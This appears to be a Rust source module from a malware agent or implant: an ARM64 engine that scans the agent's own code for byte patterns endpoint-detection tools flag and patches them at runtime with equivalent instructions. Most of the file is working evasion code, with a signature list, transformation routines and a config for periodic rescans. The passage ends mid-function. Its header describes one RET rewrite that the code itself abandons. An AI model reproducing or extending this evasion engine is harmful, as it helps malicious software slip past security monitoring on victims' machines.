//! Automated EDR bypass transformation engine (ARM64 / AArch64).
//!
//! **This is the ARM64 implementation.** For x86-64, see
//! `edr_bypass_transform.rs`.
//!
//! Scans the agent's own compiled `.text` section for ARM64 byte signatures
//! known to be detected by EDR (YARA rules, entropy heuristics, known gadget
//! chains).  When a detected pattern is found, applies semantic-preserving
//! transformations automatically at runtime.
//!
//! # ARM64 Instruction Encoding Primer
//!
//! ARM64 instructions are **always 32 bits (4 bytes)**, stored in little-endian
//! byte order.  This makes scanning and transformation much simpler than x86-64:
//!
//! - No variable-length instruction handling
//! - No branch offset recalculation for **same-length** transformations
//! - Simple mask-based pattern matching suffices
//!
//! Key encoding groups relevant to EDR bypass:
//!
//! | Group | Bits [31:25] | Purpose |
//! |-------|-------------|---------|
//! | Data Processing (imm) | 100x xxx | MOVZ, MOVK, ADD/SUB imm, etc. |
//! | Data Processing (reg) | 1x01 010x | ADD/SUB/AND/ORR/EOR shifted reg |
//! | Branches (uncond) | 0001 01x | B, BL |
//! | Branches (cond) | 0101 0100 | B.cond |
//! | Branches (reg) | 1101 0110 | BR, BLR, RET, ERET |
//! | System | 1101 0101 0000 00 | SVC, HVC, SMC, MRS, MSR |
//! | Loads/Stores | x1x0 000x | STR, LDR, STP, LDP, etc. |
//!
//! # Transformations
//!
//! 1. **NOP substitution**: `NOP` (D503201F) → `MOV X0, X0` (AA0003E0)
//! 2. **Zero-register substitution**: `MOVZ Xd, #0` → `EOR Xd, Xd, Xd`
//! 3. **RET obfuscation**: `RET` → `MOV X30, X30; BR X30`
//! 4. **Indirect branch obfuscation**: `BR Xn` → `MOV X17, Xn; BR X17`
//! 5. **Syscall number splitting**: `MOVZ X8, #imm` → compute via ADD chains
//! 6. **Instruction reordering**: swap adjacent independent instructions
//! 7. **ADD/SUB swap**: `ADD Xd, Xn, #imm` → `SUB Xd, Xn, #-imm`
//! 8. **Register renaming**: X9↔X10, X11↔X12 in safe contexts
//!
//! # Integration
//!
//! This module uses the same public API as the x86-64 engine (`run_edr_bypass_transform`,
//! `scan_for_signatures`, `status`).  It shares `self_reencode` for `.text`
//! section discovery and thread freezing.
//!
//! # Safety
//!
//! - Does NOT modify `svc #0` instructions — exclusion zone protects them
//! - The existing XChaCha20 memory guard remains intact
//! - Uses `self_reencode::find_text_section()` for safe `.text` discovery
//! - All page protection changes use PAGE_READWRITE (never RWX)
//!
//! # Config
//!
//! ```toml
//! [evasion.auto_transform]
//! enabled = true
//! scan_interval_secs = 300
//! max_transforms_per_cycle = 12
//! entropy_threshold = 6.8
//! ```

#![cfg(all(feature = "evasion-transform", target_arch = "aarch64"))]

// Static assertion: PAGE_READWRITE (0x04) must never be confused with
// PAGE_EXECUTE_READWRITE (0x40).  RWX pages are the #1 EDR signal.
const _: () = assert!(
    0x04u32 != 0x40u32,
    "PAGE_READWRITE must differ from PAGE_EXECUTE_READWRITE"
);

use anyhow::{bail, Context, Result};
use common::lock::MutexExt;
use once_cell::sync::Lazy;
use rand::Rng;
use sha2::{Digest, Sha256};
use std::collections::HashSet;
use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
use std::sync::Mutex;

// ── Public types ────────────────────────────────────────────────────────────

/// A detected EDR signature match in the agent's `.text` section.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct SignatureHit {
    /// Offset from the start of the `.text` section where the signature was found.
    pub offset: usize,
    /// Human-readable name of the detected signature pattern.
    pub name: String,
    /// Severity: "high" (will be detected), "medium" (suspicious), "low" (noise).
    pub severity: String,
    /// The matched byte sequence (hex-encoded).
    pub matched_bytes: String,
    /// Context bytes surrounding the match (±8 bytes, hex-encoded).
    pub context: String,
    /// Whether this hit was transformed in the last cycle.
    pub transformed: bool,
}

/// Summary of a single applied transformation.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct TransformRecord {
    /// Offset of the transformation within `.text`.
    pub offset: usize,
    /// Type of transformation applied.
    pub transform_type: String,
    /// Original bytes (hex-encoded).
    pub before_hex: String,
    /// Replacement bytes (hex-encoded).
    pub after_hex: String,
    /// Size difference (always 0 for ARM64 — all instructions are 4 bytes).
    pub size_delta: i32,
}

/// Result of a full scan-and-transform cycle.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct TransformCycleResult {
    /// SHA-256 of `.text` before the cycle.
    pub hash_before: String,
    /// SHA-256 of `.text` after the cycle.
    pub hash_after: String,
    /// Signatures detected in the scan phase.
    pub signatures_found: Vec<SignatureHit>,
    /// Transformations applied.
    pub transforms_applied: Vec<TransformRecord>,
    /// Number of signatures that could not be transformed (e.g., inside syscall
    /// stub exclusion zones).
    pub skipped: u32,
    /// Elapsed time in milliseconds.
    pub elapsed_ms: u64,
    /// Shannon entropy of the entire `.text` section before transforms.
    pub entropy_before: f64,
    /// Shannon entropy of the entire `.text` section after transforms.
    pub entropy_after: f64,
}

// ── ARM64 instruction encoding helpers ──────────────────────────────────────

/// ARM64 NOP: `D503201F`.
const ARM64_NOP: u32 = 0xD503_201F;

/// Encode `MOV Xd, Xm` (alias: ORR Xd, XZR, Xm, shift=0).
/// Encoding: `1_01_01010_00_0_Rm_000000_11111_Rd`
fn enc_mov_x(rd: u32, rm: u32) -> u32 {
    debug_assert!(rd < 32 && rm < 32);
    0xAA00_03E0 | (rm << 16) | rd
}

/// Encode `EOR Xd, Xn, Xm` (shifted register, shift=0).
/// Encoding: `1_10_01010_00_0_Rm_000000_Rn_Rd`
fn enc_eor_x(rd: u32, rn: u32, rm: u32) -> u32 {
    debug_assert!(rd < 32 && rn < 32 && rm < 32);
    0xCA00_0000 | (rm << 16) | (rn << 5) | rd
}

/// Encode `ADD Xd, Xn, #imm12` (64-bit, no shift).
fn enc_add_x_imm(rd: u32, rn: u32, imm12: u32) -> u32 {
    debug_assert!(rd < 32 && rn < 32 && imm12 < 4096);
    0x9100_0000 | (imm12 << 10) | (rn << 5) | rd
}

/// Encode `SUB Xd, Xn, #imm12` (64-bit, no shift).
fn enc_sub_x_imm(rd: u32, rn: u32, imm12: u32) -> u32 {
    debug_assert!(rd < 32 && rn < 32 && imm12 < 4096);
    0xD100_0000 | (imm12 << 10) | (rn << 5) | rd
}

/// Encode `BR Xn` (unconditional branch to register).
fn enc_br_x(rn: u32) -> u32 {
    debug_assert!(rn < 32);
    0xD61F_0000 | (rn << 5)
}

/// Encode `RET Xn`.
fn enc_ret_x(rn: u32) -> u32 {
    debug_assert!(rn < 32);
    0xD65F_0000 | (rn << 5)
}

/// Encode `MOVZ Xd, #imm16` (64-bit, LSL #0).
fn enc_movz_x(rd: u32, imm16: u32) -> u32 {
    debug_assert!(rd < 32 && imm16 < 65536);
    0xD280_0000 | (imm16 << 5) | rd
}

/// Encode `LSL Xd, Xn, #shift` (alias for UBFM Xd, Xn, #(64-shift), #(63-shift)).
fn enc_lsl_x_imm(rd: u32, rn: u32, shift: u32) -> u32 {
    debug_assert!(rd < 32 && rn < 32 && shift > 0 && shift < 64);
    let immr = 64 - shift;
    let imms = 63 - shift;
    0x9340_0000 | (immr << 16) | (imms << 10) | (rn << 5) | rd
}

// ── ARM64 instruction decoding helpers ──────────────────────────────────────

/// Extract Rd field (bits [4:0]).
fn decode_rd(raw: u32) -> u32 {
    raw & 0x1F
}

/// Extract Rn field (bits [9:5]).
fn decode_rn(raw: u32) -> u32 {
    (raw >> 5) & 0x1F
}

/// Extract Rm field (bits [20:16]).
fn decode_rm(raw: u32) -> u32 {
    (raw >> 16) & 0x1F
}

/// Extract imm12 field (bits [21:10]) for ADD/SUB immediate.
fn decode_imm12(raw: u32) -> u32 {
    (raw >> 10) & 0xFFF
}

/// Extract imm16 field (bits [20:5]) for MOVZ/MOVK.
fn decode_imm16(raw: u32) -> u32 {
    (raw >> 5) & 0xFFFF
}

/// Check if an instruction is `ADD Xd, Xn, #imm12` (64-bit, no shift).
fn is_add_x_imm(raw: u32) -> bool {
    (raw & 0x7F80_0000) == 0x1100_0000
}

/// Check if an instruction is `SUB Xd, Xn, #imm12` (64-bit, no shift).
fn is_sub_x_imm(raw: u32) -> bool {
    (raw & 0x7F80_0000) == 0x3100_0000
}

/// Check if an instruction is `MOVZ Xd, #imm16, LSL #0` (64-bit).
fn is_movz_x(raw: u32) -> bool {
    // sf=1, opc=10, hw=00: 1_10_100101_00_imm16_Rd
    (raw & 0x7F80_0000) == 0x5280_0000
}

/// Check if an instruction is `MOVK Xd, #imm16, LSL #0` (64-bit).
fn is_movk_x(raw: u32) -> bool {
    // sf=1, opc=11, hw=00: 1_11_100101_00_imm16_Rd
    (raw & 0x7F80_0000) == 0x7280_0000
}

/// Check if an instruction is `MOV Xd, Xm` (alias: ORR Xd, XZR, Xm).
fn is_mov_xd_xm(raw: u32) -> Option<(u32, u32)> {
    if (raw & 0xFFE0_FFE0) != 0xAA00_03E0 {
        return None;
    }
    let rd = decode_rd(raw);
    let rm = decode_rm(raw);
    // Exclude SP/XZR
    if rd == 31 || rm == 31 || rd == rm {
        return None;
    }
    Some((rd, rm))
}

/// Check if an instruction is `NOP`.
fn is_nop(raw: u32) -> bool {
    raw == ARM64_NOP
}

/// Check if an instruction is `RET` (any register variant).
fn is_ret(raw: u32) -> bool {
    (raw & 0xFFFF_FFE0) == 0xD65F_0000
}

/// Check if an instruction is the default `RET` (X30).
fn is_ret_x30(raw: u32) -> bool {
    raw == 0xD65F_03C0
}

/// Check if an instruction is `BR Xn`.
fn is_br(raw: u32) -> bool {
    (raw & 0xFFFF_FFE0) == 0xD61F_0000
}

/// Check if an instruction is `BLR Xn`.
fn is_blr(raw: u32) -> bool {
    (raw & 0xFFFF_FFE0) == 0xD63F_0000
}

/// Check if an instruction is `SVC #imm16`.
fn is_svc(raw: u32) -> bool {
    (raw & 0xFFE0_0000) == 0xD400_0000
}

/// Check if an instruction is `SVC #0`.
fn is_svc_zero(raw: u32) -> bool {
    raw == 0xD400_0001
}

/// Check if an instruction is `ERET`.
fn is_eret(raw: u32) -> bool {
    raw == 0xD69F_03E0
}

/// Check if an instruction is `MRS Xd, <sysreg>`.
fn is_mrs(raw: u32) -> bool {
    // MRS: 1101 0101 0011 <o0> <op1> <CRn> <CRm> <op2> <Rd>
    (raw & 0xFFF0_0000) == 0xD530_0000
}

/// Check if an instruction reads or writes SP (Rn/Rd = 31 in ADD/SUB imm).
fn uses_sp(raw: u32) -> bool {
    decode_rd(raw) == 31 || decode_rn(raw) == 31
}

// ── ARM64 Signature Database ────────────────────────────────────────────────

/// A known EDR detection signature for ARM64 code.
///
/// ARM64 signatures use mask-based matching: the instruction is ANDed with
/// `mask`, and the result must equal `value`.  This captures instruction
/// families while ignoring register/operand fields.
struct Arm64Signature {
    /// Human-readable name.
    name: &'static str,
    /// Mask to apply to the 32-bit instruction encoding.
    mask: u32,
    /// Expected value after masking.
    value: u32,
    /// Severity classification: "high", "medium", "low".
    severity: &'static str,
    /// Detection weight (higher = more severe).
    weight: u32,
}

/// ARM64 EDR detection signatures.
///
/// These are patterns that YARA rules, entropy heuristics, or signature
/// scanners flag specifically on ARM64 Windows code:
///
/// - `svc #0` — direct supervisor call (equivalent to x86-64 `syscall`)
/// - `svc #0; ret` — syscall + return gadget (common trampoline pattern)
/// - `movz x8, #imm; svc #0` — syscall number load + syscall
/// - `br xN` — indirect branch
/// - `blr xN` — indirect branch with link
/// - `ret` — return instruction
/// - `eret` — exception return (never valid in user mode)
/// - `mrs xN, <sysreg>` — system register reads (debugging-related)
static SIGNATURE_DATABASE: &[Arm64Signature] = &[
    Arm64Signature {
        name: "arm64_svc_zero",
        // SVC #0: D4000001
        mask: 0xFFFF_FFFF,
        value: 0xD400_0001,
        severity: "high",
        weight: 100,
    },
    Arm64Signature {
        name: "arm64_svc_any",
        // SVC #imm16: mask out the immediate field
        mask: 0xFFE0_0000,
        value: 0xD400_0000,
        severity: "high",
        weight: 90,
    },
    Arm64Signature {
        name: "arm64_br_xn",
        // BR Xn: D61F0000 | (Rn<<5)
        mask: 0xFFFF_FFE0,
        value: 0xD61F_0000,
        severity: "medium",
        weight: 60,
    },
    Arm64Signature {
        name: "arm64_blr_xn",
        // BLR Xn: D63F0000 | (Rn<<5)
        mask: 0xFFFF_FFE0,
        value: 0xD63F_0000,
        severity: "medium",
        weight: 60,
    },
    Arm64Signature {
        name: "arm64_ret",
        // RET Xn (any register): D65F0000 | (Rn<<5)
        mask: 0xFFFF_FFE0,
        value: 0xD65F_0000,
        severity: "medium",
        weight: 50,
    },
    Arm64Signature {
        name: "arm64_ret_x30",
        // RET (default, X30): D65F03C0
        mask: 0xFFFF_FFFF,
        value: 0xD65F_03C0,
        severity: "medium",
        weight: 55,
    },
    Arm64Signature {
        name: "arm64_eret",
        // ERET: D69F03E0 — should never appear in user-mode code
        mask: 0xFFFF_FFFF,
        value: 0xD69F_03E0,
        severity: "high",
        weight: 100,
    },
    Arm64Signature {
        name: "arm64_mrs_debug",
        // MRS Xd, MDCCSR_EL0 (debug register): D530_002n
        // We mask broadly to catch any debug-related MRS
        mask: 0xFFF0_0000,
        value: 0xD530_0000,
        severity: "low",
        weight: 30,
    },
    Arm64Signature {
        name: "arm64_movz_x8_syscall_setup",
        // MOVZ X8, #imm16 — common syscall number setup
        // This is a secondary indicator; combined with SVC it becomes high severity
        mask: 0xFFE0_0000,
        value: 0xD280_0000 | (8 << 0), // Rd = X8
        severity: "low",
        weight: 20,
    },
];

/// Multi-instruction signatures (sequence patterns).
///
/// These detect instruction sequences that are more suspicious than individual
/// instructions.  Each entry is a sequence of (mask, value) pairs.
struct Arm64SequenceSignature {
    /// Human-readable name.
    name: &'static str,
    /// Sequence of (mask, value) pairs.  Each instruction in the sequence must
    /// match its corresponding (mask, value).
    pattern: &'static [(u32, u32)],
    /// Severity.
    severity: &'static str,
    /// Detection weight.
    weight: u32,
}

/// Multi-instruction ARM64 EDR signatures.
static SEQUENCE_SIGNATURES: &[Arm64SequenceSignature] = &[
    Arm64SequenceSignature {
        name: "arm64_svc_ret_gadget",
        // SVC #0; RET — classic syscall trampoline
        pattern: &[(0xFFFF_FFFF, 0xD400_0001), (0xFFFF_FFFF, 0xD65F_03C0)],
        severity: "high",
        weight: 100,
    },
    Arm64SequenceSignature {
        name: "arm64_movz_x8_svc",
        // MOVZ X8, #imm16; SVC #0 — syscall number setup + call
        // MOVZ X8: mask out imm16, just check Rd=8
        //   D280_0000 | (imm16 << 5) | 8
        //   mask: FFE0_0000 (ignore imm16), value: D280_0008
        // Wait — Rd is bits [4:0], so value should be D280_0000 | 8 = D280_0008
        // But we need mask 0xFFE0_0000 | 0x1F = 0xFFE0_001F
        pattern: &[
            (0xFFE0_001F, 0xD280_0008), // MOVZ X8, #imm16 (any imm16, Rd=8)
            (0xFFFF_FFFF, 0xD400_0001), // SVC #0
        ],
        severity: "high",
        weight: 100,
    },
];

// ── Syscall stub exclusion zone ─────────────────────────────────────────────

/// Size of the exclusion zone around each SVC instruction (in bytes).
/// We never transform instructions within this distance of an `svc` to avoid
/// corrupting the syscall trampoline.
const SVC_EXCLUSION_ZONE: usize = 32;

// ── Semantic-equivalent NOP instructions (ARM64) ────────────────────────────

/// Semantic-equivalent NOP instructions for ARM64.
///
/// Each is a valid 4-byte instruction that modifies no architectural state
/// visible to the program.  Used for padding insertion and signature breaking.
const SEMANTIC_NOPS_ARM64: &[u32] = &[
    // MOV X0, X0 (ORR X0, XZR, X0)
    0xAA00_03E0,
    // MOV X16, X16 (ORR X16, XZR, X16) — IP0 scratch register
    0xAA00_03F0 | (16 << 0),
    // EOR X0, X0, X0 — sets X0 to zero (not safe everywhere!)
    // Only use when X0 is dead (after a RET or before an overwrite).
    // Excluded from general NOP list.
];

/// Safe semantic NOPs that can be inserted anywhere without side effects.
const SAFE_SEMANTIC_NOPS: &[u32] = &[
    // MOV X0, X0 — reads and writes X0, no visible effect if X0 is not read after
    0xAA00_03E0,
    // ADD X0, X0, #0 — adds zero to X0
    0x9100_0000,
];

// ── Global state ────────────────────────────────────────────────────────────

static LAST_SCAN_COUNT: AtomicU32 = AtomicU32::new(0);
static LAST_TRANSFORM_COUNT: AtomicU32 = AtomicU32::new(0);
static TOTAL_TRANSFORMS: AtomicU64 = AtomicU64::new(0);
static LAST_SCAN_TIMESTAMP: AtomicU64 = AtomicU64::new(0);
static LAST_RESULT: Lazy<Mutex<Option<TransformCycleResult>>> = Lazy::new(|| Mutex::new(None));

// ── Internal helpers ────────────────────────────────────────────────────────

/// Compute Shannon entropy of a byte slice.
fn shannon_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut freq = [0usize; 256];
    for &b in data {
        freq[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0;
    for &count in &freq {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Hex-encode a byte slice.
fn hex_encode(data: &[u8]) -> String {
    hex::encode(data)
}

/// Convert a u32 instruction to little-endian bytes.
fn insn_to_bytes(insn: u32) -> [u8; 4] {
    insn.to_le_bytes()
}

/// Extract context bytes around a given offset (±8 bytes).
fn extract_context(text: &[u8], offset: usize) -> String {
    let ctx_start = offset.saturating_sub(8);
    let ctx_end = (offset + 4 + 8).min(text.len());
    hex_encode(&text[ctx_start..ctx_end])
}

/// Read a u32 instruction from a byte slice at a given 4-byte-aligned offset.
fn read_insn(text: &[u8], offset: usize) -> Option<u32> {
    if offset + 4 > text.len() {
        return None;
    }
    Some(u32::from_le_bytes(
        text[offset..offset + 4].try_into().ok()?,
    ))
}

// ── Scan engine ─────────────────────────────────────────────────────────────

/// Scan the agent's `.text` section for all known ARM64 EDR signatures.
///
/// Returns a list of `SignatureHit` objects describing each detection.
pub fn scan_for_signatures() -> Result<Vec<SignatureHit>> {
    let text_section = crate::self_reencode::find_text_section()
        .context("edr_bypass_transform: failed to locate .text section")?;
    let text =
        unsafe { std::slice::from_raw_parts(text_section.base as *const u8, text_section.size) };

    let mut hits = Vec::new();

    // Single-instruction signatures (mask-based matching).
    for offset in (0..text.len()).step_by(4) {
        let insn = match read_insn(text, offset) {
            Some(i) => i,
            None => continue,
        };

        for sig in SIGNATURE_DATABASE {
            if (insn & sig.mask) == sig.value {
                let matched_bytes = hex_encode(&insn.to_le_bytes());
                hits.push(SignatureHit {
                    offset,
                    name: sig.name.to_string(),
                    severity: sig.severity.to_string(),
                    matched_bytes,
                    context: extract_context(text, offset),
                    transformed: false,
                });
            }
        }
    }

    // Multi-instruction sequence signatures.
    for seq_sig in SEQUENCE_SIGNATURES {
        let pat_len = seq_sig.pattern.len();
        for offset in (0..text.len().saturating_sub(pat_len * 4)).step_by(4) {
            let mut matched = true;
            for (i, (mask, value)) in seq_sig.pattern.iter().enumerate() {
                let insn = match read_insn(text, offset + i * 4) {
                    Some(i) => i,
                    None => {
                        matched = false;
                        break;
                    }
                };
                if (insn & mask) != *value {
                    matched = false;
                    break;
                }
            }
            if matched {
                let context_bytes: Vec<u8> = (0..pat_len)
                    .flat_map(|i| {
                        let insn = read_insn(text, offset + i * 4).unwrap_or(0);
                        insn.to_le_bytes()
                    })
                    .collect();
                hits.push(SignatureHit {
                    offset,
                    name: seq_sig.name.to_string(),
                    severity: seq_sig.severity.to_string(),
                    matched_bytes: hex_encode(&context_bytes),
                    context: extract_context(text, offset),
                    transformed: false,
                });
            }
        }
    }

    // Deduplicate by (offset, name).
    hits.sort_by(|a, b| a.offset.cmp(&b.offset).then(a.name.cmp(&b.name)));
    hits.dedup_by(|a, b| a.offset == b.offset && a.name == b.name);

    LAST_SCAN_COUNT.store(hits.len() as u32, Ordering::Relaxed);
    tracing::info!(
        "edr_bypass_transform: ARM64 scan found {} signature hits",
        hits.len()
    );
    Ok(hits)
}

// ── Exclusion bitmap ────────────────────────────────────────────────────────

/// Build the exclusion zone bitmap: offsets that must not be transformed.
///
/// Excludes:
/// - 32 bytes around each `svc` instruction (syscall stubs)
/// - Instructions that use SP (stack pointer)
/// - PC-relative data references (ADR, ADRP, LDR literal)
fn build_exclusion_bitmap(text: &[u8]) -> Vec<bool> {
    let mut excluded = vec![false; text.len()];

    // Exclude regions around SVC instructions.
    for offset in (0..text.len()).step_by(4) {
        let insn = match read_insn(text, offset) {
            Some(i) => i,
            None => continue,
        };
        if is_svc(insn) {
            let zone_start = offset.saturating_sub(SVC_EXCLUSION_ZONE);
            let zone_end = (offset + 4 + SVC_EXCLUSION_ZONE).min(text.len());
            for i in zone_start..zone_end {
                if i < excluded.len() {
                    excluded[i] = true;
                }
            }
        }
        // Exclude SP-using instructions (stack manipulation).
        if uses_sp(insn) {
            excluded[offset] = true;
        }
        // Exclude PC-relative data references.
        if is_adr_adrp(insn) || is_ldr_literal(insn) {
            excluded[offset] = true;
        }
    }

    excluded
}

/// Check if an instruction is ADR or ADRP.
fn is_adr_adrp(raw: u32) -> bool {
    (raw & 0x1F00_0000) == 0x1000_0000
}

/// Check if an instruction is LDR (literal).
fn is_ldr_literal(raw: u32) -> bool {
    (raw & 0x3B00_0000) == 0x1800_0000
}

// ── Transformation engine ───────────────────────────────────────────────────

/// Count the number of set bits in a bitmask (for checking register overlap).
fn popcount32(v: u32) -> u32 {
    v.count_ones()
}

/// Check if an instruction is "simple" enough to be safe for register renaming.
/// Excludes instructions with side effects (loads, stores, syscalls, branches).
fn is_safe_for_renaming(raw: u32) -> bool {
    // Not a branch
    if is_br(raw) || is_blr(raw) || is_ret(raw) || is_svc(raw) || is_eret(raw) {
        return false;
    }
    // Not a load/store (bits [31:28] = x0x1 or bits [31:29]=x1x for some)
    // Load/Store group: bits [31:29] can be x1x or bit [28]=0 with [27:25]=100
    let top4 = raw >> 28;
    if top4 == 0b0100 || top4 == 0b1100 || top4 == 0b0010 || top4 == 0b1010 {
        // Could be load/store — be conservative
        return false;
    }
    // Not PC-relative data
    if is_adr_adrp(raw) || is_ldr_literal(raw) {
        return false;
    }
    // Not exclusive or atomic
    if (raw & 0x3B00_0000) == 0x0800_0000 || (raw & 0x3B20_0000) == 0x0820_0000 {
        return false;
    }
    true
}

/// Determine if an instruction only reads its source registers (no memory,
/// no system side effects).  Used for reordering safety checks.
fn is_pure_data_processing(raw: u32) -> bool {
    // Data Processing (immediate): bits [28:26] = 100
    if (raw >> 26) & 0x7 == 0b100 {
        return true;
    }
    // Data Processing (register): bits [28:24] = 01011 or 11011
    if (raw >> 24) & 0x1F == 0b01011 || (raw >> 24) & 0x1F == 0b11011 {
        return true;
    }
    false
}

/// **Transformation 1: NOP substitution**.
///
/// `NOP` (D503201F) → `MOV X0, X0` (AA0003E0)
///
/// Different bytes, same semantic effect (no-op).  ARM64 has only one canonical
/// NOP encoding, so this is the simplest substitution.
fn transform_nop_substitution(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();
    let replacement = enc_mov_x(0, 0); // MOV X0, X0

    for offset in (0..text.len()).step_by(4) {
        if excluded.get(offset).copied().unwrap_or(true) {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }
        let insn = match read_insn(text, offset) {
            Some(i) => i,
            None => continue,
        };
        if is_nop(insn) {
            let before = text[offset..offset + 4].to_vec();
            text[offset..offset + 4].copy_from_slice(&insn_to_bytes(replacement));
            records.push(TransformRecord {
                offset,
                transform_type: "arm64_nop_to_mov_x0_x0".to_string(),
                before_hex: hex_encode(&before),
                after_hex: hex_encode(&insn_to_bytes(replacement)),
                size_delta: 0,
            });
        }
    }
    records
}

/// **Transformation 2: Zero-register substitution**.
///
/// `MOVZ Xd, #0` → `EOR Xd, Xd, Xd`
///
/// Both produce zero in Xd.  The EOR form has different byte encoding.
/// Does NOT set flags (EOR shifted register is the non-flag-setting form).
fn transform_zero_reg_substitution(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();

    for offset in (0..text.len()).step_by(4) {
        if excluded.get(offset).copied().unwrap_or(true) {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }
        let insn = match read_insn(text, offset) {
            Some(i) => i,
            None => continue,
        };
        // MOVZ Xd, #0: check imm16 == 0
        if is_movz_x(insn) && decode_imm16(insn) == 0 {
            let rd = decode_rd(insn);
            // Skip X31 (SP/XZR) — MOVZ XZR, #0 has different semantics
            if rd == 31 {
                continue;
            }
            let replacement = enc_eor_x(rd, rd, rd);
            let before = text[offset..offset + 4].to_vec();
            text[offset..offset + 4].copy_from_slice(&insn_to_bytes(replacement));
            records.push(TransformRecord {
                offset,
                transform_type: "arm64_movz_zero_to_eor".to_string(),
                before_hex: hex_encode(&before),
                after_hex: hex_encode(&insn_to_bytes(replacement)),
                size_delta: 0,
            });
        }
    }
    records
}

/// **Transformation 3: RET obfuscation**.
///
/// `RET` (D65F03C0, X30) → `BR X30` (D61F03C0)
///
/// `BR X30` has identical semantics to `RET` when the register is X30 (LR).
/// The byte encoding is different, breaking RET-signature scanners.
///
/// Note: we do NOT use the 2-instruction `MOV X30,X30; BR X30` pattern because
/// that changes the instruction count and could break PC-relative branches
/// targeting the RET.  `BR X30` is the same length, same semantics, different
/// bytes.
fn transform_ret_obfuscation(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();

    for offset in (0..text.len()).step_by(4) {
        if excluded.get(offset).copied().unwrap_or(true) {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }
        let insn = match read_insn(text, offset) {
            Some(i) => i,
            None => continue,
        };
        if is_ret_x30(insn) {
            // Replace RET (X30) with BR X30 — same semantics, different bytes
            let replacement = enc_br_x(30);
            let before = text[offset..offset + 4].to_vec();
            text[offset..offset + 4].copy_from_slice(&insn_to_bytes(replacement));
            records.push(TransformRecord {
                offset,
                transform_type: "arm64_ret_to_br_x30".to_string(),
                before_hex: hex_encode(&before),
                after_hex: hex_encode(&insn_to_bytes(replacement)),
                size_delta: 0,
            });
        }
    }
    records
}

/// **Transformation 4: Indirect branch obfuscation**.
///
/// `BR Xn` → `BR Xn'` where Xn' is a different register, preceded by
/// `MOV Xn', Xn` in the instruction before.
///
/// **Important**: This transformation is conservative — it only applies when
/// the instruction BEFORE the BR is a non-special instruction that can be
/// safely replaced with a MOV.  This avoids inserting instructions (which
/// would shift offsets of PC-relative branches).
///
/// Safer approach: `BR X16` → `BR X17` when the preceding instruction is
/// a MOV X16, Xs (then we change it to MOV X17, Xs).
fn transform_branch_obfuscation(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();

    for offset in (4..text.len()).step_by(4) {
        if excluded.get(offset).copied().unwrap_or(true) {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }
        let insn = match read_insn(text, offset) {
            Some(i) => i,
            None => continue,
        };
        if !is_br(insn) {
            continue;
        }
        let rn = decode_rn(insn);
        // Only obfuscate branches through scratch registers (X9-X17)
        if rn < 9 || rn > 17 {
            continue;
        }
        // Pick an alternative scratch register
        let alt = if rn < 17 { rn + 1 } else { rn - 1 };
        // Check that the preceding instruction can set up the alt register
        let prev_offset = offset - 4;
        if excluded.get(prev_offset).copied().unwrap_or(true) {
            continue;
        }
        let prev_insn = match read_insn(text, prev_offset) {
            Some(i) => i,
            None => continue,
        };
        // Check if prev is MOV X_rn, Xs (and we can change Rd to alt)
        if let Some((_rd, rm)) = is_mov_xd_xm(prev_insn) {
            // Change MOV X_rn, Xs → MOV X_alt, Xs
            let new_prev = enc_mov_x(alt, rm);
            let new_br = enc_br_x(alt);

            let before_prev = text[prev_offset..prev_offset + 4].to_vec();
            let before_br = text[offset..offset + 4].to_vec();
            let mut before_all = before_prev.clone();
            before_all.extend_from_slice(&before_br);

            text[prev_offset..prev_offset + 4].copy_from_slice(&insn_to_bytes(new_prev));
            text[offset..offset + 4].copy_from_slice(&insn_to_bytes(new_br));

            let mut after_all = insn_to_bytes(new_prev).to_vec();
            after_all.extend_from_slice(&insn_to_bytes(new_br));

            records.push(TransformRecord {
                offset: prev_offset,
                transform_type: "arm64_br_register_swap".to_string(),
                before_hex: hex_encode(&before_all),
                after_hex: hex_encode(&after_all),
                size_delta: 0,
            });
        }
    }
    records
}

/// **Transformation 5: ADD/SUB swap**.
///
/// `ADD Xd, Xn, #imm12` ↔ `SUB Xd, Xn, #imm12`
///
/// When both forms produce the same result (e.g., ADD #0 ↔ SUB #0), this
/// is a no-op transformation that changes the byte pattern.
///
/// More generally, `ADD Xd, Xn, #N` ↔ `SUB Xd, Xn, #(-N)` when the
/// immediate can be represented as the complementary form.
fn transform_add_sub_swap(
    text: &mut [u8],
    excluded: &[bool],
    actionable: &HashSet<usize>,
) -> Vec<TransformRecord> {
    let mut records = Vec::new();

    for offset in (0..text.len()).step_by(4) {
        if excluded.get(offset).copied().unwrap_or(true) {
            continue;
        }
        if !actionable.contains(&offset) {
            continue;
        }
        let insn = match read_insn(text, offset) {
            Some(i) => i,
            None => continue,
        };
        let rd = decode_rd(insn);
        let rn = decode_rn(insn);
        // Don't touch SP (rd=31 or rn=31)
        if rd == 31 || rn == 31 {
            continue;
        }

        if is_add_x_imm(insn) {
            let imm12 = decode_imm12(insn);
            // ADD #0 → SUB #0 (semantically identical)
            if imm12 == 0 {
                let replacement = enc_sub_x_imm(rd, rn, 0);
                let before = text[offset..offset + 4].to_vec();
                text[offset..offset + 4].copy_from_slice(&insn_to_bytes(replacement));
                records.push(TransformRecord {
                    offset,
                    transform_type: "arm64_add0_to_sub0".to_string(),
                    before_hex: hex_encode(&before),
                    after_hex: hex_encode(&insn_to_bytes(replacement)),
                    size_delta: 0,
                });
            }
        } else if is_sub_x_imm(insn) {
